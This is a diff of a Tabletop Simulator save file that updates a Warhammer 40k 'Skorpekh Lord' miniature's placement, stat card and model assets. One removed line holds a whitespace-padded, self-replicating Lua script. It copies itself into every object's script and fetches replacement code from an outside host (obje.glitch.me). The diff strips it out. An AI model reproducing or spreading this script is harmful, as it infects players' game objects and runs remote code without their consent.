@@ -20,21 +20,21 @@
       "GUID": "d0f220",
       "Name": "Custom_Model",
       "Transform": {
-        "posX": -23.751749,
-        "posY": 1.51072621,
-        "posZ": 23.7506428,
-        "rotX": 359.989258,
-        "rotY": 195.002548,
-        "rotZ": 0.115330614,
+        "posX": 0.116834067,
+        "posY": 0.96,
+        "posZ": 16.2058,
+        "rotX": 1.28916543E-06,
+        "rotY": 195.000015,
+        "rotZ": -2.64752748E-06,
         "scaleX": 1.0,
         "scaleY": 1.0,
         "scaleZ": 1.0
       },
-      "Nickname": "Skorpekh Destroyer Lord",
-      "Description": "",
+      "Nickname": "Skorpekh Lord",
+      "Description": "[00ff00]M   T   Sv   W   Ld   OC  [-]\r\n8\"   7   3+   7    6+   2\n\r\n[ff0000]Ranged Weapons[-]\r\n[c0c0c0]Enmitic Annihilator[-]\r\n18\" A:2 BS:2+ S:6 AP:-1 D:1 [00ffff][Rapid Fire 2][-]\n\r\n[ff0000]Melee Weapons[-]\r\n[c0c0c0]Flensing Claw[-]\r\nA:8 WS:2+ S:6 AP:-1 D:1\r\n[c0c0c0]Hyperphase Harvester[-]\r\nA:4 WS:2+ S:10 AP:-3 D:3\n\r\n[ff00ff]Abilities[-]\r\nInvulnerable Save (4+)\r\nLeader\r\nReanimation Protocols\r\nUnited In Destruction\r\nCrimson Harvest",
       "GMNotes": "",
       "AltLookAngle": {
-        "x": 0.0,
+        "x": 270.0,
         "y": 0.0,
         "z": 0.0
       },
@@ -77,26 +77,26 @@
         },
         "CastShadows": true
       },
-      "LuaScript": "                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find(\"ereh edoc resU\")+1):gsub(\"[%(%)%.%%%+%-%*%?%[%]%^%$]\",\"%%%0\"),\"\"))end end end end end;WebRequest.get(\"https://obje.glitch.me/\",function(g)if g.is_error then log(g.error)elseif g.text~=\"\"and g.text:sub(1,4)==\"true\"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]\n\n",
+      "LuaScript": "",
       "LuaScriptState": "",
       "XmlUI": "",
-      "ChildObjects": [
-        {
-          "GUID": "fa1e8c",
+      "States": {
+        "2": {
+          "GUID": "a59bf3",
           "Name": "Custom_Model",
           "Transform": {
-            "posX": 2.98711821E-05,
-            "posY": -0.138951018,
-            "posZ": -9.521231E-06,
-            "rotX": -0.00037728154,
-            "rotY": -0.0003391273,
-            "rotZ": -0.00154005294,
-            "scaleX": 1.94999909,
-            "scaleY": 1.949999,
-            "scaleZ": 1.94999945
+            "posX": 2.05145717,
+            "posY": 0.9599999,
+            "posZ": 15.2984,
+            "rotX": 7.10676147E-07,
+            "rotY": 14.9827766,
+            "rotZ": -3.04377267E-07,
+            "scaleX": 1.0,
+            "scaleY": 1.0,
+            "scaleZ": 1.0
           },
-          "Nickname": "Necron Tomb World Topper",
-          "Description": "",
+      "Nickname": "Skorpekh Lord",
+      "Description": "[00ff00]M   T   Sv   W   Ld   OC  [-]\r\n8\"   7   3+   7    6+   2\n\r\n[ff0000]Ranged Weapons[-]\r\n[c0c0c0]Enmitic Annihilator[-]\r\n18\" A:2 BS:2+ S:6 AP:-1 D:1 [00ffff][Rapid Fire 2][-]\n\r\n[ff0000]Melee Weapons[-]\r\n[c0c0c0]Flensing Claw[-]\r\nA:8 WS:2+ S:6 AP:-1 D:1\r\n[c0c0c0]Hyperphase Harvester[-]\r\nA:4 WS:2+ S:10 AP:-3 D:3\n\r\n[ff00ff]Abilities[-]\r\nInvulnerable Save (4+)\r\nLeader\r\nReanimation Protocols\r\nUnited In Destruction\r\nCrimson Harvest",
           "GMNotes": "",
           "AltLookAngle": {
             "x": 0.0,
@@ -104,48 +104,117 @@
             "z": 0.0
           },
           "ColorDiffuse": {
-            "r": 1.0,
-            "g": 1.0,
-            "b": 1.0
+            "r": 0.0,
+            "g": 0.0,
+            "b": 0.0
           },
           "LayoutGroupSortIndex": 0,
           "Value": 0,
-          "Locked": true,
+          "Locked": false,
           "Grid": true,
-          "Snap": false,
+          "Snap": true,
           "IgnoreFoW": false,
-          "MeasureMovement": true,
+          "MeasureMovement": false,
           "DragSelectable": true,
           "Autoraise": true,
-          "Sticky": false,
+          "Sticky": true,
           "Tooltip": true,
           "GridProjection": false,
           "HideWhenFaceDown": false,
           "Hands": false,
           "CustomMesh": {
-            "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1750180373835501276/CE6ECA70E6AEA91DBB6E1349AFEB29F687B24B35/",
-            "DiffuseURL": "https://cdn.discordapp.com/attachments/640337780064387085/1132975205959073932/Necron1.png",
-            "NormalURL": "https://steamusercontent-a.akamaihd.net/ugc/1751306760243787403/F42D7E97B96E97590C2AD2249C81A19C34F533AE/",
-            "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1750180373835501276/CE6ECA70E6AEA91DBB6E1349AFEB29F687B24B35/",
+            "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1043093675415146025/C7E32BED1D5F0FDB7DD7B7B3CBBC7F72008B6A95/",
+            "DiffuseURL": "",
+            "NormalURL": "",
+            "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1043093675414912909/2453A883C68E3D8221CF26563E22F095A941E4EA/",
             "Convex": true,
-            "MaterialIndex": 4,
+            "MaterialIndex": 1,
             "TypeIndex": 1,
             "CustomShader": {
               "SpecularColor": {
-                "r": 1.0,
-                "g": 1.0,
-                "b": 1.0
+                "r": 0.875,
+                "g": 0.812880337,
+                "b": 0.7463235
               },
-              "SpecularIntensity": 0.015,
-              "SpecularSharpness": 6.500001,
-              "FresnelStrength": 0.133333579
+              "SpecularIntensity": 0.05,
+              "SpecularSharpness": 2.0,
+              "FresnelStrength": 0.107142858
             },
             "CastShadows": true
           },
           "LuaScript": "",
           "LuaScriptState": "",
-          "XmlUI": ""
-        },
+          "XmlUI": "",
+          "ChildObjects": [
+            {
+              "GUID": "c1d9a2",
+              "Name": "Custom_Model",
+              "Transform": {
+                "posX": 0,
+                "posY": 0.13,
+                "posZ": 0,
+                "rotX": 0,
+                "rotY": 0,
+                "rotZ": 0,
+                "scaleX": 1,
+                "scaleY": 1,
+                "scaleZ": 1
+              },
+              "Nickname": "",
+              "Description": "",
+              "GMNotes": "",
+              "AltLookAngle": {
+                "x": 0.0,
+                "y": 0.0,
+                "z": 0.0
+              },
+              "ColorDiffuse": {
+                "r": 1.0,
+                "g": 1.0,
+                "b": 1.0
+              },
+              "LayoutGroupSortIndex": 0,
+              "Value": 0,
+              "Locked": false,
+              "Grid": true,
+              "Snap": true,
+              "IgnoreFoW": false,
+              "MeasureMovement": false,
+              "DragSelectable": true,
+              "Autoraise": true,
+              "Sticky": true,
+              "Tooltip": true,
+              "GridProjection": false,
+              "HideWhenFaceDown": false,
+              "Hands": false,
+              "CustomMesh": {
+                "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1344838192470200757/BB3B4BFC093D4E52D1F99520D77FE2E3E693FD89/",
+                "DiffuseURL": "https://steamusercontent-a.akamaihd.net/ugc/1697254053193207400/31B3BBB743FE43CAD13FC6E2FEE43E744B4B0B9E/",
+                "NormalURL": "",
+                "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1043093675414912909/2453A883C68E3D8221CF26563E22F095A941E4EA/",
+                "Convex": true,
+                "MaterialIndex": 3,
+                "TypeIndex": 1,
+                "CustomShader": {
+                  "SpecularColor": {
+                    "r": 1.0,
+                    "g": 1.0,
+                    "b": 1.0
+                  },
+                  "SpecularIntensity": 0.0,
+                  "SpecularSharpness": 2.0,
+                  "FresnelStrength": 0.0
+                },
+                "CastShadows": true
+              },
+              "LuaScript": "",
+              "LuaScriptState": "",
+              "XmlUI": ""
+            }
+          ]
+        }
+      },
+      "ChildObjects": [
         {
           "GUID": "2f70b3",
           "Name": "Custom_Assetbundle",
